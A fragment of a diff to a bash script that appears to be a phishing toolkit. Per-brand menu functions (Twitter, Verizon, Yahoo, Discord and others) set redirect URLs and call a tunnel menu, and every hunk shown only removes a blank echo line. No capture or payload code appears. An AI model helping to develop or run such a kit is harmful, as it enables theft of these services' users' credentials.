 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2812,7 +2852,7 @@ esac
 site_twitter(){
 siname="Twitter"
 rdurl="twitter.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2843,7 +2883,7 @@ esac
 site_ubereats(){
 siname="ubereats"
 rdurl="www.ubereats.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2874,7 +2914,7 @@ esac
 site_verizon(){
 siname="Verizon"
 rdurl="www.verizon.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2913,7 +2953,7 @@ tunnelmenu
 site_vk(){
 siname="VK"
 rdurl="vk.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2957,7 +2997,7 @@ tunnelmenu
 site_wordpress(){
 siname="Wordpress"
 rdurl="wordpress.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -2988,7 +3028,7 @@ esac
 site_xbox(){
 siname="Xbox"
 rdurl="www.xbox.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -3019,7 +3059,7 @@ esac
 site_yahoo(){
 siname="Yahoo"
 rdurl="yahoo.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -3050,7 +3090,7 @@ esac
 site_yandex(){
 siname="Yandex"
 rdurl="yandex.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -3081,7 +3121,7 @@ esac
 site_ytsubs(){
 siname="YT subs"
 rdurl="www.youtube.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -3113,7 +3153,7 @@ esac
 site_discord(){
 siname="Discord"
 rdurl="www.discord.com"
-{ clear; banner; echo -e ""; }
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
